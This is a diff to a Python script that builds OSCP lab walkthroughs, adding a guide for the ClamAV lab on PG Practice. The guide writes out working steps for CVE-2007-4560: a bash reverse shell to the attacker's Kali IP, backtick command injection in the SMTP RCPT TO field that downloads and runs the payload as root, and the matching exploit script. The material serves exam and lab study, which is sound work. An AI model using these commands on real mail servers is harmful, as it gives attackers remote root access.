@@ -171,8 +171,58 @@ bratarina = {
     '👑 A service running as root gives you root directly, with no privesc needed.'],
 }
 
+clamav = {
+  'title': 'Linux · Sendmail + clamav-milter RCE → direct root',
+  'lab': {'name': 'ClamAV', 'platform': 'PG Practice', 'os': 'Linux'},   # not on TJ Null's list
+  'ips': {'K': '192.168.45.180', 'T': '192.168.153.52'},
+  'steps': [
+    {'h': 'Recon', 'b': [
+      P('There is only **one flag**, `proof.txt`: the exploit drops you straight in as root.'),
+      C('sudo nmap -p- --min-rate 5000 -Pn {T} -oN clam_ports.txt\nsudo nmap -sC -sV -p 22,25,80 -Pn {T} -oN clam_svc.txt'),
+      O('22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu\n25/tcp open  smtp     Sendmail 8.15.2\n80/tcp open  http     Apache httpd 2.4.18'),
+      P('🎯 The lead is **Sendmail on 25**, paired with **clamav-milter** on this box.')]},
+    {'h': 'SMTP banner', 'b': [
+      C('nc -nv {T} 25'),
+      O('220 clamav ESMTP Sendmail 8.15.2'),
+      P('💥 **CVE-2007-4560**: the `RCPT TO` field is passed to a shell, so commands run **as root**.')]},
+    {'h': 'Find the exploit', 'b': [
+      C('searchsploit clamav\nsearchsploit -m 4761'),
+      O('Sendmail with clamav-milter < 0.91.2 - Remote Root Command Execution | 4761.pl')]},
+    {'h': 'Manual exploit, part 1: download the payload', 'b': [
+      P('On Kali, make the payload and host it:'),
+      C("echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 80"),
+      P('Open an SMTP session and inject through the backticks in `RCPT TO`:'),
+      C('nc -nv {T} 25'),
+      C('HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`wget http://{K}/shell.sh -O /tmp/s.sh`>\nDATA\ntest\n.\nQUIT', 'smtp'),
+      P('Wait for `GET /shell.sh` in the web server window, then stop it with `Ctrl+C`.'),
+      W('Keep the **nobody+** format with its backticks exactly as shown: the backticks are what run the command.')]},
+    {'h': 'Manual exploit, part 2: run it as root', 'b': [
+      W('The web server and the listener both need **port 80** on Kali (egress is filtered), and only one can use it at a time. Stop the web server before you start the listener.'),
+      C('rlwrap nc -lvnp 80'),
+      P('A second mail runs the payload:'),
+      C('nc -nv {T} 25'),
+      C('HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`bash /tmp/s.sh`>\nDATA\ntest\n.\nQUIT', 'smtp'),
+      O('uid=0(root) gid=0(root) groups=0(root)'),
+      P('👑 Root shell on the listener.')]},
+    {'h': 'proof.txt', 'b': [
+      C("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"),
+      F('proof.txt captured 👑')]},
+  ],
+  'backup': {'h': 'Backup route: the automated exploit', 'b': [
+    P('Same order: web server on 80 for the first command, then stop it and start the listener on 80 for the second.'),
+    C("perl 4761.pl {T} 'wget http://{K}/shell.sh -O /tmp/s.sh'\nperl 4761.pl {T} 'bash /tmp/s.sh'"),
+    P('Keep download and execute as two commands: a single chained one is unreliable through the milter.')]},
+  'takeaways': [
+    '📧 **Sendmail + clamav** is a signature combo: go straight to CVE-2007-4560.',
+    '📖 Read the **header/usage** of any downloaded exploit: argument order varies between copies.',
+    '🖐️ Prefer the **manual method** when a scripted exploit is flaky.',
+    '✂️ Split **download** and **execute** into two steps.',
+    '🌐 Egress filtered? Reuse **port 80** for hosting and the callback, one at a time.',
+    '👑 RCE as a root service means a **direct root shell**, no privesc stage.'],
+}
+
 out = ('/* Step-by-step walkthroughs for labs, shown on the lab page.\n'
        '   Built by build_guides.py. {K} is your Kali IP and {T} the target IP. */\n'
-       'window.OSCP_GUIDES = ' + json.dumps({'pgp-jacko': jacko, 'pgp-nibbles': nibbles, 'pgp-bratarina': bratarina}, ensure_ascii=False, indent=1) + ';\n')
+       'window.OSCP_GUIDES = ' + json.dumps({'pgp-jacko': jacko, 'pgp-nibbles': nibbles, 'pgp-bratarina': bratarina, 'pgp-clamav': clamav}, ensure_ascii=False, indent=1) + ';\n')
 io.open(r'C:\Users\bhavi\Desktop\Personal_App\lib\oscp-guides.js', 'w', encoding='utf-8', newline='\n').write(out)
 print(len(out))
